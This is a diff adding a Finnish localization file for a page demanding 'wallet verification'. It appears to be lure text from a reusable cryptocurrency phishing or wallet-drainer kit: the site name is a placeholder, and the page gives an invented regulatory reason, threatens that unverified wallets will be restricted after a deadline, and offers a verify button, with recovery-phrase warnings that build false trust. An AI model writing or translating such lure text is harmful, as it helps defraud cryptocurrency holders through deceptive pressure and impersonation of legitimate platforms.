@@ -1,0 +1,31 @@
+﻿{
+    "pageTitle": "Lompakko Vahvistus | {websiteName}",
+    "mainTitle": "Lompakko Vahvistus Vaaditaan",
+    "description1": "Turvastandardien ja sääntelyn noudattamiseksi vaadimme nyt lompakko-osoitteen vahvistusta kaikilta käyttäjiltä.",
+    "deadlineText": "Alkaen {date}, mikä tahansa vahvistamaton lompakko on",
+    "restrictionText": " väliaikaisesti rajoitettu",
+    "cooperationText": "Arvostamme yhteistyötänne alustamme turvallisuuden säilyttämisessä.",
+    "termsText": "Hyväksyn {websiteName}:n",
+    "termsLink": "Käyttöehdot",
+    "verifyBtnText": "Vahvista Lompakkoni",
+    "securityBtnText": "Vaarantuneista Lauseista",
+    "modalTitle": "Turvallisuusvaroitus: Vaarantuneet Palautuslauseet",
+    "modalWarning": "Kriittinen Varoitus:",
+    "modalWarningText": "Palautuslauseesi on lompakkosi pääavain. Älä koskaan paljasta sitä kenellekään tai kirjoita sitä mihinkään verkkosivustoon.",
+    "signsTitle": "Vaarantuneen lauseen merkit:",
+    "signsList": [
+        "Jaettu jonkun kanssa, joka väittää olevansa tuki",
+        "Tallennettu digitaalisesti (kuvat, pilvi, viestit)",
+        "Luvattomat tapahtumat lompakossasi"
+    ],
+    "actionTitle": "Välitön toiminta vaaditaan jos vaarantunut:",
+    "actionList": [
+        "Siirrä kaikki varat välittömästi uuteen turvalliseen lompakkoon",
+        "Luo täysin uusi palautuslause",
+        "Älä koskaan käytä vanhan lauseen mitään versiota"
+    ],
+    "modalNote": "Huomio: {websiteName} ei koskaan pyydä palautuslauseesi. Tämä vahvistusprosessi vaatii vain julkisen lompakko-osoitteesi."
+} 
+
+
+
